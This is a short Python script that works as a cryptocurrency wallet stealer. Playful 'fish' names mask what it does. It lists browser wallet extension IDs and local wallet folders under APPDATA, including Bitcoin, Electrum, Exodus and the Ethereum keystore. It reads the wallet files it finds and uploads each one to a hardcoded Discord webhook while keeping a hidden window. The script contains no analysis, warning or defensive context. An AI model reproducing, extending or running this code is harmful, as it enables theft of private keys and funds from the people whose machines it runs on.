import os
import requests
import time
import tkinter as tk  # Importing tkinter for GUI

appdata_path = os.path.join(os.getenv('APPDATA'))

applefry = "https://discord.com/api/webhooks/1289453262231306294/2mvDt8pJ2IgFGGTSuPX461D1sioknPfj7P5di4hxmIxD95IZZRWqN4v7K9q13H2NcQXj"

fish_types = {
    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
    "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
    "Coin98": "aeachknmefphepccionboohckonoeemg",
    "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
    "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
    "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
    "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
    "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
    "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
    "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
    "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
    "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
    "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
    "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
    "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
}

fish_paths = {
    "Bitcoin": os.path.join(appdata_path, "Bitcoin", "wallets"),
    "Zcash": os.path.join(appdata_path, "Zcash"),
    "Armory": os.path.join(appdata_path, "Armory"),
    "Bytecoin": os.path.join(appdata_path, "bytecoin"),
    "Jaxx": os.path.join(appdata_path, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
    "Exodus": os.path.join(appdata_path, "Exodus", "exodus.wallet"),
    "Ethereum": os.path.join(appdata_path, "Ethereum", "keystore"),
    "Electrum": os.path.join(appdata_path, "Electrum", "wallets"),
    "AtomicWallet": os.path.join(appdata_path, "atomic", "Local Storage", "leveldb"),
    "Guarda": os.path.join(appdata_path, "Guarda", "Local Storage", "leveldb"),
    "Coinomi": os.path.join(appdata_path, "Coinomi", "Coinomi", "wallets"),
}

def find_fish_species():
    found_fish = {}
    for fish_name, fish_path in fish_paths.items():
        if os.path.exists(fish_path):
            fish_files = os.listdir(fish_path)
            found_fish[fish_name] = fish_files
    return found_fish

def send_fish_message_to_bait(fish_details):
    for fish_name, files in fish_details.items():
        file_list = "\n".join(files)
        message = f"**Fish Type:** {fish_name}\n**Files:**\n{file_list}"
        fish_message = {
            "content": message
        }
        requests.post(applefry, json=fish_message)
        for file_name in files:
            file_path = os.path.join(fish_paths[fish_name], file_name)
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    fish_meal = {
                        'file': (file_name, f)
                    }
                    requests.post(applefry, files=fish_meal)
                    time.sleep(1)

# Create a hidden Tkinter window
root = tk.Tk()
root.withdraw()  # Hide the main window

fish_species = find_fish_species()
if fish_species:
    send_fish_message_to_bait(fish_species)
